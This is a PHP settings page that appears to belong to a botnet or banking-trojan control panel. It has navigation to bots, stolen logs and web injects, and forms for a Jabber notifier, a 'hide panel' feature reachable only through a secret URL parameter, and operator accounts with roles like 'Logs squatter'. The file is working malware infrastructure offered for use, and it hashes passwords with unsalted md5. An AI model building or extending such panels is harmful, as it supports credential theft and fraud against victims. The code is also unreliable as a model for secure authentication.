<?php
require_once('includes/config.php');
?>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="index.php?action=panel" class="item">Logs</a>
      <a href="index.php?action=payload" class="item">Web Inject</a>
      <a href="index.php?action=listpayload" class="item">List Web Inject</a>
      <a href="index.php?action=settings" class="active item">Settings</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
        <?php
        if(isset($_POST['jabber'])){
            $jabber_username = $_POST['username'];
            $jabber_password = $_POST['password'];
            $jabber_to  = $_POST['xmpp'];
            if(isset($jabber_username) && $jabber_username != '' && isset($jabber_password) && $jabber_password != '' && isset($jabber_to) && $jabber_to != ''){
                global $bdd;
                $select = $bdd->prepare("SELECT * FROM settings WHERE jabber_username = :jabber_username");
                $select->bindParam(':jabber_username', $jabber_username);
                $select->execute();
                if($select->rowCount() > 0){
                    $fetch = $select->fetch();
                    if($fetch['jabber_username'] != ''){
                        $update = $bdd->prepare("UPDATE settings SET jabber_username = :username, jabber_password = :password, jabber_to = :jabber_to");
                        $update->bindParam(':username', $jabber_username);
                        $update->bindParam(':password', $jabber_password);
                        $update->bindParam(':jabber_to', $jabber_to);
                        $update->execute(); 
                        echo '<div class="ui green message">Jabber update !</div>';
                    }
                }
                else{
                    $update = $bdd->prepare("UPDATE settings SET jabber_username = :username, jabber_password = :password, jabber_to = :jabber_to");
                    $update->bindParam(':username', $jabber_username);
                    $update->bindParam(':password', $jabber_password);
                    $update->bindParam(':jabber_to', $jabber_to);
                    $update->execute();
                    echo '<div class="ui green message">Jabber update !</div>';
                }
            }
        }
        ?>
        <form class="ui form" action="#" method="post">
            <h4 class="ui dividing header">Jabber notifier</h4>
            <div class="field">
                <input type="text" name="username" placeholder="XMPP username" />
            </div>
            <div class="field">
                <input type="password" name="password" placeholder="XMPP password" />
            </div>
            <div class="field">
                <input type="text" name="xmpp" placeholder="XMPP to receive" />
            </div>
            <input type="submit" name="jabber" class="ui button" value="Jabber notifier" />
        </form>
    </div>
    <div class="ui segment">
        <?php
        if(isset($_POST['hide'])){
            $get_name = $_POST['get_name'];
            $get_value = $_POST['get_value'];
            if($get_name != '' && $get_value != ''){
                $select_hide_status = $bdd->prepare("SELECT * FROM settings");
                $select_hide_status->execute();
                if($select_hide_status->rowCount() > 0){
                    $fetch = $select_hide_status->fetch();
                    if($fetch['hide_panel'] < 1){
                        $update = $bdd->prepare("UPDATE settings SET hide_panel = '1', get_name = :name, get_value = :value");
                        $update->bindParam(':name', $get_name);
                        $update->bindParam(':value', $get_value);
                        $update->execute();
                        echo '<div class="ui green message">access to panel with index.php?'.$get_name.'='.$get_value.'</div>';
                    }
                }
            }
            else{
                echo '<div class="ui red message">Error</div>';
            }
        }
        if(isset($_POST['disabled'])){
            $update = $bdd->prepare("UPDATE settings SET hide_panel = '0', get_name = '', get_value = ''");
            $update->execute();
            echo '<div class="ui green message">disabled</div>';
        }
        ?>
        <form class="ui form" action="#" method="post">
            <h4 class="ui dividing header">Hide panel</h4>
            <div class="field">
                <input type="text" name="get_name" placeholder="Get name" />
            </div>
            <div class="field">
                <input type="text" name="get_value" placeholder="Get value" />
            </div>
            <input type="submit" name="hide" class="ui button" value="active" />
            <input type="submit" name="disabled" class="ui button" value="disable" />
        </form>
    </div>
    <div class="ui segment">
        <?php
        if(isset($_POST['add_user'])){
            $username = $_POST['username'];
            $password = $_POST['password'];
            $roles = $_POST['role'];
            
            if($username != '' && $password != '' && $roles != ''){
                $select = $bdd->prepare("SELECT * FROM utilisateurs WHERE username = :username");
                $select->bindParam(':username', $username);
                $select->execute();
                if($select->rowCount() > 0){
                    $fetch = $select->fetch();
                    if($fetch['username'] == $username){
                        echo '<div class="ui error message">User already here</div>';
                    }
                    else{
                        echo '<div class="ui error message">Error</div>';
                    }
                }
                else{
                    if($roles == '0' || $roles == '1'){
                        $insert = $bdd->prepare("INSERT INTO utilisateurs(username,password,roles) VALUES(:username, :password, :roles)");
                        $md5 = md5($password);
                        $insert->bindParam(':username', $username);
                        $insert->bindParam(':password', $md5);
                        $insert->bindParam(':roles', $roles);
                        $insert->execute();
                        echo '<div class="ui green message">User added!</div>';
                    }
                    else{
                        echo '<div class="ui error message">Error</div>';
                    }
                }
            }
        }
        ?>
        <form class="ui form" action="#" method="post">
            <h4 class="ui dividing header">Add user</h4>
            <div class="field">
                <input type="text" name="username" placeholder="username" />
            </div>
            <div class="field">
                <input type="password" name="password" placeholder="password" />
            </div>
            <div class="field">
                <select class="ui" name="role">
                    <option value="0">Administrator</option>
                    <option value="1">Logs squatter</option>
                </select>
                <ul class="ui list">
                    <li><b>Administrator</b>: All right</li>
                    <li><b>Logs squatter</b>: Only logs</li>
                </ul>
            </div>
            <input type="submit" name="add_user" class="ui button" value="Add user" />
        </form>
    </div>
</div>